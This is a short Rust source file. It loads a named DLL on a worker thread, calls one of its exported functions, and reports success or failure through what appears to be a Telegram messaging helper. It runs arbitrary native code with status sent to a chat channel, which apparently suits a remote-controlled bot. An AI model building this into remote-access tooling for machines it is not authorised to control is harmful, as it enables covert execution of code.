use crate::functions::tg_until::tg_tools;
use std::path::Path;
use libloading::{Library, Symbol};

/// 调用指定dll的start函数（假设签名为 extern "C" fn() ）
pub fn run_dll(dll_name: &str, fuction_name: &str) -> Result<(), String> {
    if !Path::new(dll_name).exists() {
        let msg = format!("DLL not found: {}", dll_name);
        let _ = tg_tools::sendmessage(&msg);
        return Err(msg);
    }
    let dll_name = dll_name.to_string();
    let fuction_name = fuction_name.to_string();
    let handle = std::thread::spawn(move || {
        unsafe {
            let lib = match Library::new(&dll_name) {
                Ok(lib) => lib,
                Err(e) => {
                    let msg = format!("Could not load DLL: {}", e);
                    let _ = tg_tools::sendmessage(&msg);
                    return Err(msg);
                }
            };
            let func: Symbol<unsafe extern "C" fn()> = match lib.get(fuction_name.as_bytes()) {
                Ok(f) => f,
                Err(e) => {
                    let msg = format!("Could not find function: {}", e);
                    let _ = tg_tools::sendmessage(&msg);
                    return Err(msg);
                }
            };
            func();
        }
        let msg = format!("Successfully called function {} in {}", fuction_name, dll_name);
        let _ = tg_tools::sendmessage(&msg);
        Ok(())
    });
    match handle.join() {
        Ok(res) => res,
        Err(_) => {
            let msg = "Thread panicked while loading DLL".to_string();
            let _ = tg_tools::sendmessage(&msg);
            Err(msg)
        }
    }
}
